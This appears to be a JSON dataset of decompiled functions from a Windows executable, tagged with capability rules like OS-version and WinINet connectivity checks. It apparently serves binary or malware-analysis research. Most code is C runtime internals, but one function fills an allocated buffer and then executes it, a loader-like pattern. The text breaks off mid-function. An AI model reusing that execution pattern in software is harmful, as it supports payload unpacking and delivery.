{
    "00401000": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.00401000(void)\n\n{\n    int32_t var_8h;\n    uint var_4h;\n    \n    // [00] -r-x section size 40960 named .text\n    var_4h = 0;\n    for (var_8h = 0x103; -1 < var_8h; var_8h = var_8h + -1) {\n        var_4h = fcn.00401050(var_4h, var_8h);\n    }\n    return var_4h;\n}\n",
        "token_count": 121
    },
    "00401070": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00401070(void)\n\n{\n    uint *puVar1;\n    code *pcVar2;\n    uint var_10h;\n    uint var_ch;\n    uint *var_8h;\n    uint var_4h;\n    \n    var_8h = fcn.00401000();\n    pcVar2 = fcn.00401120(0x100000);\n    while (var_8h != NULL) {\n        *(pcVar2 + var_8h[3] * 4) = var_8h[2];\n        puVar1 = *var_8h;\n        fcn.00401228(var_8h);\n        var_8h = puVar1;\n    }\n    (*pcVar2)();\n    return;\n}\n",
        "token_count": 164
    },
    "004010d0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t * __cdecl fcn.004010d0(int32_t arg_8h)\n\n{\n    int32_t *piVar1;\n    uint var_8h;\n    uint var_4h;\n    \n    piVar1 = fcn.00401290(0x8000);\n    fcn.00401230(piVar1, 0, 0x8000);\n    *piVar1 = arg_8h;\n    if (arg_8h != 0) {\n        *(arg_8h + 4) = piVar1;\n    }\n    return piVar1;\n}\n",
        "token_count": 131
    },
    "00401512": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.00401512(uint arg_8h)\n\n{\n    int32_t arg_8h_00;\n    int32_t unaff_EBP;\n    uint var_1ch;\n    int32_t arg_ch;\n    uint var_4h;\n    \n    fcn.004026d8(0x40b950, 0xc);\n    arg_ch = *(unaff_EBP + 8);\n    if (arg_ch != 0) {\n        if (*0x45da44 == 3) {\n            fcn.004029d8(4);\n            *(unaff_EBP + -4) = 0;\n            arg_8h_00 = fcn.00402a66(arg_ch);\n            *(unaff_EBP + -0x1c) = arg_8h_00;\n            if (arg_8h_00 != 0) {\n                fcn.00402a91(arg_8h_00, arg_ch);\n            }\n            *(unaff_EBP + -4) = 0xffffffff;\n            fcn.00401565();\n            if (*(unaff_EBP + -0x1c) != 0) goto code_r0x0040157d;\n            arg_ch = *(unaff_EBP + 8);\n        }\n        (*_sym.imp.KERNEL32.dll_HeapFree)(*0x45da40, 0, arg_ch);\n    }\ncode_r0x0040157d:\n    fcn.00402713();\n    return;\n}\n",
        "token_count": 342
    },
    "null": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "",
        "token_count": 0
    },
    "00401ccb": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00401ccb(uint8_t **arg_8h, int32_t *arg_ch)\n\n{\n    bool bVar1;\n    bool bVar2;\n    uint8_t *in_EAX;\n    uint8_t *puVar3;\n    uint8_t *puVar4;\n    uint8_t uVar5;\n    uint8_t *in_ECX;\n    uint32_t uVar6;\n    int32_t *unaff_ESI;\n    uint var_4h;\n    \n    bVar1 = false;\n    *unaff_ESI = 0;\n    *arg_ch = 1;\n    if (arg_8h != NULL) {\n        *arg_8h = in_ECX;\n        arg_8h = arg_8h + 1;\n    }\n    do {\n        if (*in_EAX == 0x22) {\n            bVar1 = !bVar1;\n            puVar3 = in_EAX + 1;\n            uVar5 = 0x22;\n        }\n        else {\n            *unaff_ESI = *unaff_ESI + 1;\n            if (in_ECX != NULL) {\n                *in_ECX = *in_EAX;\n                in_ECX = in_ECX + 1;\n            }\n            uVar5 = *in_EAX;\n            puVar3 = in_EAX + 1;\n            if ((*(uVar5 + 0x45d801) & 4) != 0) {\n                *unaff_ESI = *unaff_ESI + 1;\n                if (in_ECX != NULL) {\n                    *in_ECX = *puVar3;\n                    in_ECX = in_ECX + 1;\n                }\n                puVar3 = in_EAX + 2;\n            }\n            if (uVar5 == 0) {\n                puVar3 = puVar3 + -1;\n                goto code_r0x00401d44;\n            }\n        }\n        in_EAX = puVar3;\n    } while ((bVar1) || ((uVar5 != 0x20 && (uVar5 != 9))));\n    if (in_ECX != NULL) {\n        in_ECX[-1] = 0;\n    }\ncode_r0x00401d44:\n    bVar1 = false;\n    while (*puVar3 != 0) {\n        for (; (*puVar3 == 0x20 || (*puVar3 == 9)); puVar3 = puVar3 + 1) {\n        }\n        if (*puVar3 == 0) break;\n        if (arg_8h != NULL) {\n            *arg_8h = in_ECX;\n            arg_8h = arg_8h + 1;\n        }\n        *arg_ch = *arg_ch + 1;\n        while( true ) {\n            bVar2 = true;\n            uVar6 = 0;\n            for (; *puVar3 == 0x5c; puVar3 = puVar3 + 1) {\n                uVar6 = uVar6 + 1;\n            }\n            if (*puVar3 == 0x22) {\n                puVar4 = puVar3;\n                if ((uVar6 & 1) == 0) {\n                    if ((!bVar1) || (puVar4 = puVar3 + 1,  *puVar4 != 0x22)) {\n                        bVar2 = false;\n                        puVar4 = puVar3;\n                    }\n                    bVar1 = !bVar1;\n                }\n                uVar6 = uVar6 >> 1;\n                puVar3 = puVar4;\n            }\n            for (; uVar6 != 0; uVar6 = uVar6 - 1) {\n                if (in_ECX != NULL) {\n                    *in_ECX = 0x5c;\n                    in_ECX = in_ECX + 1;\n                }\n                *unaff_ESI = *unaff_ESI + 1;\n            }\n            uVar5 = *puVar3;\n            if ((uVar5 == 0) || ((!bVar1 && ((uVar5 == 0x20 || (uVar5 == 9)))))) break;\n            if (bVar2) {\n                if (in_ECX == NULL) {\n                    if ((*(uVar5 + 0x45d801) & 4) != 0) {\n                        puVar3 = puVar3 + 1;\n                        *unaff_ESI = *unaff_ESI + 1;\n                    }\n                }\n                else {\n                    if ((*(uVar5 + 0x45d801) & 4) != 0) {\n                        *in_ECX = uVar5;\n                        in_ECX = in_ECX + 1;\n                        puVar3 = puVar3 + 1;\n                        *unaff_ESI = *unaff_ESI + 1;\n                    }\n                    *in_ECX = *puVar3;\n                    in_ECX = in_ECX + 1;\n                }\n                *unaff_ESI = *unaff_ESI + 1;\n            }\n            puVar3 = puVar3 + 1;\n        }\n        if (in_ECX != NULL) {\n            *in_ECX = 0;\n            in_ECX = in_ECX + 1;\n        }\n        *unaff_ESI = *unaff_ESI + 1;\n    }\n    if (arg_8h != NULL) {\n        *arg_8h = NULL;\n    }\n    *arg_ch = *arg_ch + 1;\n    return;\n}\n",
        "token_count": 1213
    },
    "00401ffb": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.00401ffb(void)\n\n{\n    int32_t *piVar1;\n    uint *puVar2;\n    uint *puVar3;\n    uint uVar4;\n    uint *puVar5;\n    int32_t iVar6;\n    uint32_t uVar7;\n    int32_t iVar8;\n    int32_t *piVar9;\n    uchar auStack68 [46];\n    int16_t iStack22;\n    int32_t *piStack20;\n    \n    puVar3 = fcn.0040162a(0x480);\n    if (puVar3 == NULL) {\n        uVar4 = 0xffffffff;\n    }\n    else {\n        *0x45da48 = 0x20;\n        *0x45da60 = puVar3;\n        for (; puVar3 < *0x45da60 + 0x120; puVar3 = puVar3 + 9) {\n            *puVar3 = 0xffffffff;\n            puVar3[2] = 0;\n            *(puVar3 + 1) = 0;\n            *(puVar3 + 5) = 10;\n        }\n        (*_sym.imp.KERNEL32.dll_GetStartupInfoA)(auStack68);\n        if ((iStack22 != 0) && (piStack20 != NULL)) {\n            iVar8 = *piStack20;\n            piStack20 = piStack20 + 1;\n            piVar9 = iVar8 + piStack20;\n            if (0x7ff < iVar8) {\n                iVar8 = 0x800;\n            }\n            iVar6 = iVar8;\n            if (*0x45da48 < iVar8) {\n                puVar3 = 0x45da64;\n                do {\n                    puVar5 = fcn.0040162a(0x480);\n                    iVar6 = *0x45da48;\n                    if (puVar5 == NULL) break;\n                    *0x45da48 = *0x45da48 + 0x20;\n                    *puVar3 = puVar5;\n                    puVar2 = puVar5;\n                    for (; puVar5 < puVar2 + 0x120; puVar5 = puVar5 + 9) {\n                        *puVar5 = 0xffffffff;\n                        puVar5[2] = 0;\n                        *(puVar5 + 1) = 0;\n                        *(puVar5 + 5) = 10;\n                        puVar2 = *puVar3;\n                    }\n                    puVar3 = puVar3 + 1;\n                    iVar6 = iVar8;\n                } while (*0x45da48 < iVar8);\n            }\n            uVar7 = 0;\n            if (0 < iVar6) {\n                do {\n                    if (((*piVar9 != -1) && ((*piStack20 & 1) != 0)) &&\n                       (((*piStack20 & 8) != 0 || (iVar8 = (*_sym.imp.KERNEL32.dll_GetFileType)(*piVar9),  iVar8 != 0)))\n                       ) {\n                        piVar1 = *((uVar7 >> 5) * 4 + 0x45da60) + (uVar7 & 0x1f) * 0x24;\n                        *piVar1 = *piVar9;\n                        *(piVar1 + 1) = *piStack20;\n                        iVar8 = fcn.004048dd(piVar1 + 3, 4000);\n                        if (iVar8 == 0) {\n                            return 0xffffffff;\n                        }\n                        piVar1[2] = piVar1[2] + 1;\n                    }\n                    piVar9 = piVar9 + 1;\n                    uVar7 = uVar7 + 1;\n                    piStack20 = piStack20 + 1;\n                } while (uVar7 < iVar6);\n            }\n        }\n        iVar8 = 0;\n        do {\n            piVar9 = *0x45da60 + iVar8 * 9;\n            if (*piVar9 == -1) {\n                *(piVar9 + 1) = 0x81;\n                if (iVar8 == 0) {\n                    iVar6 = -10;\n                }\n                else {\n                    iVar6 = -0xb - (iVar8 != 1);\n                }\n                iVar6 = (*_sym.imp.KERNEL32.dll_GetStdHandle)(iVar6);\n                if ((iVar6 == -1) || (uVar7 = (*_sym.imp.KERNEL32.dll_GetFileType)(iVar6),  uVar7 == 0)) {\n                    *(piVar9 + 1) = *(piVar9 + 1) | 0x40;\n                }\n                else {\n                    *piVar9 = iVar6;\n                    if ((uVar7 & 0xff) == 2) {\n                        *(piVar9 + 1) = *(piVar9 + 1) | 0x40;\n                    }\n                    else if ((uVar7 & 0xff) == 3) {\n                        *(piVar9 + 1) = *(piVar9 + 1) | 8;\n                    }\n                    iVar6 = fcn.004048dd(piVar9 + 3, 4000);\n                    if (iVar6 == 0) {\n                        return 0xffffffff;\n                    }\n                    piVar9[2] = piVar9[2] + 1;\n                }\n            }\n            else {\n                *(piVar9 + 1) = *(piVar9 + 1) | 0x80;\n            }\n            iVar8 = iVar8 + 1;\n        } while (iVar8 < 3);\n        (*_sym.imp.KERNEL32.dll_SetHandleCount)(*0x45da48);\n        uVar4 = 0;\n    }\n    return uVar4;\n}\n",
        "token_count": 1260
    },
    "004024f9": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.004024f9(void)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    uint uVar4;\n    \n    iVar2 = fcn.0040286d();\n    if (iVar2 == 0) {\n        fcn.004022d6();\n        return 0;\n    }\n    iVar2 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(\"kernel32.dll\");\n    pcVar1 = _sym.imp.KERNEL32.dll_GetProcAddress;\n    if (iVar2 != 0) {\n        *0x45d4a4 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(iVar2, \"FlsAlloc\");\n        *0x45d4a8 = (*pcVar1)(iVar2, \"FlsGetValue\");\n        *0x45d4ac = (*pcVar1)(iVar2, \"FlsSetValue\");\n        *0x45d4b0 = (*pcVar1)(iVar2, \"FlsFree\");\n        if (*0x45d4a8 == 0) {\n            *0x45d4a8 = _sym.imp.KERNEL32.dll_TlsGetValue;\n            *0x45d4ac = _sym.imp.KERNEL32.dll_TlsSetValue;\n            *0x45d4a4 = 0x4022cd;\n            *0x45d4b0 = _sym.imp.KERNEL32.dll_TlsFree;\n        }\n    }\n    *0x45cb6c = (**0x45d4a4)(fcn.00402377);\n    if (((*0x45cb6c != -1) && (puVar3 = fcn.00404968(1, 0x8c),  puVar3 != NULL)) &&\n       (iVar2 = (**0x45d4ac)(*0x45cb6c, puVar3),  iVar2 != 0)) {\n        puVar3[0x15] = 0x45cac0;\n        puVar3[5] = 1;\n        uVar4 = (*_sym.imp.KERNEL32.dll_GetCurrentThreadId)();\n        puVar3[1] = 0xffffffff;\n        *puVar3 = uVar4;\n        return 1;\n    }\n    fcn.004022d6();\n    return 0;\n}\n",
        "token_count": 507
    },
    "00402a91": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00402a91(uint32_t *arg_8h, int32_t arg_ch)\n\n{\n    int32_t *piVar1;\n    char *pcVar2;\n    uint32_t *puVar3;\n    int32_t *piVar4;\n    char cVar5;\n    uint32_t uVar6;\n    uint32_t uVar7;\n    code *pcVar8;\n    uint8_t uVar9;\n    uint32_t uVar10;\n    uint32_t *puVar11;\n    uint32_t *puVar12;\n    uint32_t *puVar13;\n    uint32_t uVar14;\n    uint32_t uVar15;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint32_t var_4h;\n    \n    uVar6 = arg_8h[4];\n    puVar13 = arg_ch + -4;\n    uVar15 = arg_ch - arg_8h[3] >> 0xf;\n    piVar4 = uVar15 * 0x204 + 0x144 + uVar6;\n    var_4h = *puVar13 - 1;\n    if ((var_4h & 1) == 0) {\n        puVar11 = var_4h + puVar13;\n        uVar14 = *puVar11;\n        uVar7 = *(arg_ch + -8);\n        if ((uVar14 & 1) == 0) {\n            uVar10 = (uVar14 >> 4) - 1;\n            if (0x3f < uVar10) {\n                uVar10 = 0x3f;\n            }\n            if (puVar11[1] == puVar11[2]) {\n                if (uVar10 < 0x20) {\n                    pcVar2 = uVar10 + 4 + uVar6;\n                    uVar10 = ~(0x80000000U >> (uVar10 & 0x1f));\n                    puVar12 = uVar6 + 0x44 + uVar15 * 4;\n                    *puVar12 = *puVar12 & uVar10;\n                    *pcVar2 = *pcVar2 + -1;\n                    if (*pcVar2 == '\\0') {\n                        *arg_8h = *arg_8h & uVar10;\n                    }\n                }\n                else {\n                    pcVar2 = uVar10 + 4 + uVar6;\n                    uVar10 = ~(0x80000000U >> (uVar10 - 0x20 & 0x1f));\n                    puVar12 = uVar6 + 0xc4 + uVar15 * 4;\n                    *puVar12 = *puVar12 & uVar10;\n                    *pcVar2 = *pcVar2 + -1;\n                    if (*pcVar2 == '\\0') {\n                        arg_8h[1] = arg_8h[1] & uVar10;\n                    }\n                }\n            }\n            var_4h = var_4h + uVar14;\n            *(puVar11[2] + 4) = puVar11[1];\n            *(puVar11[1] + 8) = puVar11[2];\n        }\n        puVar11 = (var_4h >> 4) + -1;\n        if (0x3f < puVar11) {\n            puVar11 = 0x3f;\n        }\n        puVar12 = arg_8h;\n        if ((uVar7 & 1) == 0) {\n            puVar13 = puVar13 - uVar7;\n            puVar12 = (uVar7 >> 4) + -1;\n            if (0x3f < puVar12) {\n                puVar12 = 0x3f;\n            }\n            var_4h = var_4h + uVar7;\n            puVar11 = (var_4h >> 4) + -1;\n            if (0x3f < puVar11) {\n                puVar11 = 0x3f;\n            }\n            if (puVar12 != puVar11) {\n                if (puVar13[1] == puVar13[2]) {\n                    if (puVar12 < 0x20) {\n                        uVar14 = ~(0x80000000U >> (puVar12 & 0x1f));\n                        puVar3 = uVar6 + 0x44 + uVar15 * 4;\n                        *puVar3 = *puVar3 & uVar14;\n                        pcVar2 = puVar12 + uVar6 + 4;\n                        *pcVar2 = *pcVar2 + -1;\n                        if (*pcVar2 == '\\0') {\n                            *arg_8h = *arg_8h & uVar14;\n                        }\n                    }\n                    else {\n                        uVar14 = ~(0x80000000U >> (puVar12 - 0x20 & 0x1f));\n                        puVar3 = uVar6 + 0xc4 + uVar15 * 4;\n                        *puVar3 = *puVar3 & uVar14;\n                        pcVar2 = puVar12 + uVar6 + 4;\n                        *pcVar2 = *pcVar2 + -1;\n                        if (*pcVar2 == '\\0') {\n                            arg_8h[1] = arg_8h[1] & uVar14;\n                        }\n                    }\n                }\n                *(puVar13[2] + 4) = puVar13[1];\n                *(puVar13[1] + 8) = puVar13[2];\n            }\n        }\n        if (((uVar7 & 1) != 0) || (puVar12 != puVar11)) {\n            piVar1 = piVar4 + puVar11 * 2;\n            uVar14 = piVar1[1];\n            puVar13[2] = piVar1;\n            puVar13[1] = uVar14;\n            piVar1[1] = puVar13;\n            *(puVar13[1] + 8) = puVar13;\n            if (puVar13[1] == puVar13[2]) {\n                cVar5 = *(puVar11 + uVar6 + 4);\n                *(puVar11 + uVar6 + 4) = cVar5 + '\\x01';\n                uVar9 = puVar11;\n                if (puVar11 < 0x20) {\n                    if (cVar5 == '\\0') {\n                        *arg_8h = *arg_8h | 0x80000000U >> (uVar9 & 0x1f);\n                    }\n                    puVar11 = uVar6 + 0x44 + uVar15 * 4;\n                    *puVar11 = *puVar11 | 0x80000000U >> (uVar9 & 0x1f);\n                }\n                else {\n                    if (cVar5 == '\\0') {\n                        arg_8h[1] = arg_8h[1] | 0x80000000U >> (uVar9 - 0x20 & 0x1f);\n                    }\n                    puVar11 = uVar6 + 0xc4 + uVar15 * 4;\n                    *puVar11 = *puVar11 | 0x80000000U >> (uVar9 - 0x20 & 0x1f);\n                }\n            }\n        }\n        *puVar13 = var_4h;\n        *((var_4h - 4) + puVar13) = var_4h;\n        *piVar4 = *piVar4 + -1;\n        pcVar8 = _sym.imp.KERNEL32.dll_VirtualFree;\n        if (*piVar4 == 0) {\n            if (*0x45da24 != NULL) {\n                (*_sym.imp.KERNEL32.dll_VirtualFree)(*0x45da3c * 0x8000 + (*0x45da24)[3], 0x8000, 0x4000);\n                (*0x45da24)[2] = (*0x45da24)[2] | 0x80000000U >> (*0x45da3c & 0x1f);\n                *((*0x45da24)[4] + 0xc4 + *0x45da3c * 4) = 0;\n                *((*0x45da24)[4] + 0x43) = *((*0x45da24)[4] + 0x43) + -1;\n                if (*((*0x45da24)[4] + 0x43) == '\\0') {\n                    (*0x45da24)[1] = (*0x45da24)[1] & 0xfffffffe;\n                }\n                if ((*0x45da24)[2] == 0xffffffff) {\n                    (*pcVar8)((*0x45da24)[3], 0, 0x8000);\n                    (*_sym.imp.KERNEL32.dll_HeapFree)(*0x45da40, 0, (*0x45da24)[4]);\n                    fcn.00405910(*0x45da24, *0x45da24 + 5, (*0x45da28 * 0x14 - *0x45da24) + -0x14 + *0x45da2c);\n                    *0x45da28 = *0x45da28 + -1;\n                    if (*0x45da24 < arg_8h) {\n                        arg_8h = arg_8h + -5;\n                    }\n                    *0x45da34 = *0x45da2c;\n                }\n            }\n            *0x45da24 = arg_8h;\n            *0x45da3c = uVar15;\n        }\n    }\n    return;\n}\n",
        "token_count": 2165
    },
    "00403316": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.00403316(void)\n\n{\n    int32_t **ppiVar1;\n    int32_t *piVar2;\n    int32_t iVar3;\n    int32_t **ppiVar4;\n    uint32_t uVar5;\n    int32_t *piVar6;\n    int32_t **ppiVar7;\n    int32_t iVar8;\n    int32_t **ppiVar9;\n    int32_t **ppiVar10;\n    uint32_t *puVar11;\n    uint32_t *puVar12;\n    uint *puVar13;\n    bool bVar14;\n    uint var_138h;\n    uint32_t *var_38h;\n    uint32_t *var_34h;\n    int32_t **var_30h;\n    int32_t **var_2ch;\n    uint32_t var_28h;\n    int32_t **var_24h;\n    uint32_t var_20h;\n    int32_t var_1ch;\n    uint32_t var_18h;\n    uint32_t var_14h;\n    uint32_t var_10h;\n    int32_t var_ch;\n    int32_t **var_8h;\n    int32_t *var_4h;\n    \n    iVar3 = (*_sym.imp.KERNEL32.dll_IsBadWritePtr)(*0x45da2c, *0x45da28 * 0x14);\n    if (iVar3 != 0) {\n        return 0xffffffff;\n    }\n    var_1ch = 0;\n    puVar11 = *0x45da2c;\n    if (0 < *0x45da28) {\n        do {\n            uVar5 = puVar11[4];\n            var_34h = puVar11;\n            iVar3 = (*_sym.imp.KERNEL32.dll_IsBadWritePtr)(uVar5, 0x41c4);\n            if (iVar3 != 0) {\n                return 0xfffffffe;\n            }\n            var_8h = puVar11[3];\n            var_24h = uVar5 + 0x144;\n            var_20h = puVar11[2];\n            puVar12 = uVar5 + 0xc4;\n            var_10h = 0;\n            var_14h = 0;\n            var_ch = 0;\n            do {\n                var_28h = 0;\n                var_18h = 0;\n                var_4h = NULL;\n                bVar14 = -1 < var_20h;\n                puVar13 = &var_138h;\n                var_38h = puVar12;\n                for (iVar3 = 0x40; iVar3 != 0; iVar3 = iVar3 + -1) {\n                    *puVar13 = 0;\n                    puVar13 = puVar13 + 1;\n                }\n                if (bVar14) {\n                    iVar3 = (*_sym.imp.KERNEL32.dll_IsBadWritePtr)(var_8h, 0x8000);\n                    if (iVar3 != 0) {\n                        return 0xfffffffc;\n                    }\n                    iVar3 = 0;\n                    ppiVar9 = var_8h + 0x3ff;\n                    do {\n                        ppiVar4 = ppiVar9 + -0x3fc;\n                        if ((ppiVar9[-0x3fd] != 0xffffffff) || (*ppiVar9 != 0xffffffff)) {\n                            return 0xfffffffb;\n                        }\n                        do {\n                            piVar2 = *ppiVar4;\n                            if ((piVar2 & 1) == 0) {\n                                iVar8 = (piVar2 >> 4) + -1;\n                                if (0x3f < iVar8) {\n                                    iVar8 = 0x3f;\n                                }\n                                (&var_138h)[iVar8] = (&var_138h)[iVar8] + 1;\n                                piVar6 = piVar2;\n                            }\n                            else {\n                                if (0x400 < piVar2 - 1U) {\n                                    return 0xfffffffa;\n                                }\n                                var_4h = var_4h + 1;\n                                piVar6 = piVar2 - 1U;\n                            }\n                            if (((piVar6 < 0x10) || ((piVar6 & 0xf) != 0)) || (0xff0 < piVar6)) {\n                                return 0xfffffff9;\n                            }\n                            ppiVar4 = piVar6 + ppiVar4;\n                            if (ppiVar4[-1] != piVar2) {\n                                return 0xfffffff8;\n                            }\n                        } while (ppiVar4 < ppiVar9);\n                        if (ppiVar4 != ppiVar9) {\n                            return 0xfffffff8;\n                        }\n                        ppiVar9 = ppiVar9 + 0x400;\n                        iVar3 = iVar3 + 1;\n                    } while (iVar3 < 8);\n                    if (*var_24h != var_4h) {\n                        return 0xfffffff7;\n                    }\n                    iVar3 = 0;\n                    ppiVar9 = var_24h;\n                    do {\n                        var_4h = NULL;\n                        var_30h = ppiVar9 + 2;\n                        ppiVar4 = ppiVar9[1];\n                        var_2ch = ppiVar9;\n                        ppiVar10 = var_30h;\n                        if (ppiVar4 != ppiVar9) {\n                            do {\n                                if (var_4h == (&var_138h)[iVar3]) break;\n                                if ((ppiVar4 < var_8h) || (var_8h + 0x2000 <= ppiVar4)) {\n                                    return 0xfffffff6;\n                                }\n                                ppiVar7 = (ppiVar4 & 0xfffff000) + 0xc;\n                                ppiVar1 = (ppiVar4 & 0xfffff000) + 0xffc;\n                                if (ppiVar7 == ppiVar1) {\n                                    return 0xfffffff5;\n                                }\n                                do {\n                                    if (ppiVar7 == ppiVar4) break;\n                                    ppiVar7 = ppiVar7 + (*ppiVar7 & 0xfffffffe);\n                                    ppiVar10 = var_30h;\n                                } while (ppiVar7 != ppiVar1);\n                                if (ppiVar7 == ppiVar1) {\n                                    return 0xfffffff5;\n                                }\n                                iVar8 = (*ppiVar4 >> 4) + -1;\n                                if (0x3f < iVar8) {\n                                    iVar8 = 0x3f;\n                                }\n                                if (iVar8 != iVar3) {\n                                    return 0xfffffff4;\n                                }\n                                if (ppiVar4[2] != var_2ch) {\n                                    return 0xfffffff3;\n                                }\n                                var_4h = var_4h + 1;\n                                var_2ch = ppiVar4;\n                                ppiVar4 = ppiVar4[1];\n                            } while (ppiVar4 != ppiVar9);\n                            if (var_4h != NULL) {\n                                if (iVar3 < 0x20) {\n                                    uVar5 = 0x80000000 >> (iVar3 & 0x1f);\n                                    var_28h = var_28h | uVar5;\n                                    var_10h = var_10h | uVar5;\n                                }\n                                else {\n                                    uVar5 = 0x80000000 >> (iVar3 - 0x20 & 0x1f);\n                                    var_18h = var_18h | uVar5;\n                                    var_14h = var_14h | uVar5;\n                                }\n                            }\n                        }\n                        if ((var_2ch[1] != ppiVar9) || (var_4h != (&var_138h)[iVar3])) {\n                            return 0xfffffff2;\n                        }\n                        if (*ppiVar10 != var_2ch) {\n                            return 0xfffffff1;\n                        }\n                        iVar3 = iVar3 + 1;\n                        puVar11 = var_34h;\n                        puVar12 = var_38h;\n                        ppiVar9 = ppiVar10;\n                    } while (iVar3 < 0x40);\n                }\n                if ((var_28h != puVar12[-0x20]) || (var_18h != *puVar12)) {\n                    return 0xfffffff0;\n                }\n                var_8h = var_8h + 0x2000;\n                var_24h = var_24h + 0x81;\n                var_20h = var_20h << 1;\n                var_ch = var_ch + 1;\n                puVar12 = puVar12 + 1;\n            } while (var_ch < 0x20);\n            if ((var_10h != *puVar11) || (var_14h != puVar11[1])) {\n                return 0xffffffef;\n            }\n            puVar11 = puVar11 + 5;\n            var_1ch = var_1ch + 1;\n            var_38h = puVar12;\n        } while (var_1ch < *0x45da28);\n    }\n    return 0;\n}\n",
        "token_count": 2020
    },
    "0040368a": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t * __cdecl fcn.0040368a(uint32_t *arg_8h)\n\n{\n    int32_t *piVar1;\n    char *pcVar2;\n    int32_t *piVar3;\n    char cVar4;\n    int32_t *piVar5;\n    uint uVar6;\n    uint8_t uVar7;\n    uint32_t uVar8;\n    int32_t iVar9;\n    uint32_t *puVar10;\n    int32_t iVar11;\n    uint32_t uVar12;\n    int32_t *piVar13;\n    uint32_t *puVar14;\n    uint32_t *puVar15;\n    uint32_t uVar16;\n    int32_t iVar17;\n    bool bVar18;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint32_t var_8h;\n    int32_t var_4h;\n    \n    uVar8 = arg_8h + 0x17U & 0xfffffff0;\n    iVar9 = (arg_8h + 0x17U >> 4) + -1;\n    puVar10 = *0x45da2c + *0x45da28 * 5;\n    uVar7 = iVar9;\n    if (iVar9 < 0x20) {\n        uVar16 = 0xffffffff >> (uVar7 & 0x1f);\n        var_8h = 0xffffffff;\n    }\n    else {\n        uVar16 = 0;\n        var_8h = 0xffffffff >> (uVar7 - 0x20 & 0x1f);\n    }\n    bVar18 = *0x45da34 < puVar10;\n    arg_8h = *0x45da34;\n    while ((bVar18 && ((arg_8h[1] & var_8h | *arg_8h & uVar16) == 0))) {\n        arg_8h = arg_8h + 5;\n        bVar18 = arg_8h < puVar10;\n    }\n    puVar14 = *0x45da2c;\n    if (arg_8h == puVar10) {\n        for (; (puVar14 < *0x45da34 && ((puVar14[1] & var_8h | *puVar14 & uVar16) == 0)); puVar14 = puVar14 + 5) {\n        }\n        arg_8h = puVar14;\n        if (puVar14 == *0x45da34) {\n            for (; (puVar14 < puVar10 && (puVar14[2] == 0)); puVar14 = puVar14 + 5) {\n            }\n            puVar15 = *0x45da2c;\n            arg_8h = puVar14;\n            if (puVar14 == puVar10) {\n                for (; (puVar15 < *0x45da34 && (puVar15[2] == 0)); puVar15 = puVar15 + 5) {\n                }\n                arg_8h = puVar15;\n                if ((puVar15 == *0x45da34) && (arg_8h = fcn.00402da9(),  